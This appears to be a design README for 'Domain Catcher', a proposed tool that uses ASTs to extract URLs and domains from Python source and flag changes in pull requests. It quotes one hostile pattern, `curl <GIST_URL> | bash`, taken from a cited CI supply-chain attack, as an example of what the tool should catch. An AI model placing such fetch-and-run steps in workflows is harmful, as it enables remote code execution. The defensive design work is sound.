# Domain Catcher

>   For now I am focusing on DNS domains and not external dependency files, so
>   the name could change.

## Problem and Motivation

I read an article recently \
<https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/>\
which involved a pull request which contained an url in the form of 
`run: curl <GIST_URL> | bash` in the code and it went through. The article says
that the exploit could have been prevented by having proper permissions for
Github pull requests. But, I believe that having executable URLs in the pull
request should be highlighted so that they are easily spotted. Even in corporate
environment, the security team asks for a list of API endpoints being used by
the application. I think the same logic can be extended to list external files
and directories that are read or written to, directly in the source code. Also
pull requests should be scanned just like the source code.

Self hosted runners are used by many software projects. These runners might not
have appropriate firewall configurations unlike github runners. Runners should
not be able to fetch anything until explicitly allowed. Keeping the list of all
ingress points ready in the source code will help in securing these runners as
well.

## Proposed Solution

Making this information readily available and in a open format would help to
provide some transparency on source and destination of **data flow**.
The data in the open format could be used by other tools like a firewall to
determine the ACL automatically. It will also help people who like to be sure
that the software they are using is not sending/fetching data to/from somewhere
they don't know about. Like in the following link someone wanted to do just
that.\
<https://webmasters.stackexchange.com/questions/90249/how-to-list-all-urls-in-the-source-code-files-of-a-website-with-command-line-too>

## Implementation Details

To implement this and to make it general I have a thought of a few cases:
1. Hardcoded URLs and files - (Handle through static analysis or regex)
2. URLs/file-names dynamically constructed (variables/config files) - Use
   static analysis to get the config file names from which URLs/file-names are
   getting fetched and then highlight them.
3. URLs/file-names coming from database tables - use static analysis to see
   which tables they are getting fetched from and highlight those tables.
4. Obfuscated URLs/file-names - the location of the function calls for network
   or disk access can be highlighted.

The above methods use static analysis and regex for analysis. This can be
extended to using DAST tools to see the data flow during execution.

Aim: Know all points of ingress/egress for any source code repository

### Initial scope
* Only DNS Domains (HTTP), not checking external files
* Implement for only one programming language (Python)

To implement, the below cases have to be checked:
1.  True Positives (Need to identify the calling function based on programming
    language)
    1.  Hard-coded domain names
    1.  Dynamically constructed URLs
1.  False Positives (Domains which are not executable)
    1.  Comments
    1.  Documentation
    1.  Text files


### Abstract Syntax Tree (AST) requirement

*   Using only regex will not suffice for differentiating between True and False
    positives
*   Use AST to understand which are the executable domains and avoid False
    Positives

TODO: Small experiment to see how many domains are not caught by regex for some
sample repos

### High Level Overview of workflow

1.  User pushes source code to development branch
1.  Github workflow triggered for running domain-catcher on source code
    1.  Runs domain-catcher on source code
        1.  Parse source code - generate AST
        1.  Apply pre-defined rules on AST to extract domains
        1.  Generate JSON/YAML artifact for latest list or domains
    1.  Download artifact containing previous domains if it exists
    1.  Get the diff between previous and current list of domains
    1.  Create issue/email/notification if diff exists

### Existing tools for helping with implementation

1.  [Bandit](https://github.com/PyCQA/bandit) (Python)
    *   Highlights vulnerabilities using predefined rules
    *   Can refer code for parsing and applying rules
    *   Add code for creating JSON/YAML output for list of domains.

## Miscellaneous

If URLs are coming from DB, query DB to get the URLs or mention that URLs are\
coming from this table in Database in SECURITY.md.\
Alert - If any file/URL is outside scope (if provided by maintainer)\
Try to enforce and verify those are the only URLs. Transparency logs - merkel\
trees.\
Add all this information to SECURITY.md?\
Using SARIF files for reporting?
1.  Uploads SARIF file as an artifact
1.  Calls Github Codeql github action for SARIF file processing
